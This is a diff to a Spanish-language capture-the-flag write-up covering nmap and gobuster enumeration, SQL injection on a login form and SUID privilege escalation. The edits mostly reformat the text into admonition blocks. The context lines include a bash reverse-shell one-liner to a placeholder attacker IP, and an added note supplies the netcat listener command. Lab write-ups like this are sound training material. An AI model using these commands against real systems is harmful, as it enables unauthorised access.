@@ -14,11 +14,12 @@
 nmap -sCV -p- --min-rate 5000 10.10.10.XX -oN nmap.txt
 ```
 
-```text title="Resultado"
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.2p1
-80/tcp open  http    Apache httpd 2.4.41
-```
+??? example "Resultado"
+    ```text
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 8.2p1
+    80/tcp open  http    Apache httpd 2.4.41
+    ```
 
 ### Web Enumeration
 
@@ -32,6 +33,9 @@ gobuster dir -u http://10.10.10.XX -w /usr/share/wordlists/dirb/common.txt
 ## Explotación
 
 ### SQL Injection
+
+!!! tip "Tip"
+    Siempre probar payloads básicos de SQLi en formularios de autenticación antes de usar herramientas automatizadas.
 
 El formulario de login es vulnerable a SQLi:
 
@@ -53,6 +57,9 @@ El formulario de login es vulnerable a SQLi:
 ```bash
 bash -i >& /dev/tcp/10.10.14.XX/443 0>&1
 ```
+
+!!! note "Listener"
+    No olvides iniciar el listener antes: `nc -nlvp 443`
 
 ## Escalada de Privilegios
 
@@ -83,3 +90,4 @@ find / -perm -4000 2>/dev/null
 !!! success "Lecciones aprendidas"
     - Siempre probar SQLi en formularios de login
     - Enumerar binarios SUID como parte del proceso de privesc
+    - Mantener notas organizadas durante el proceso
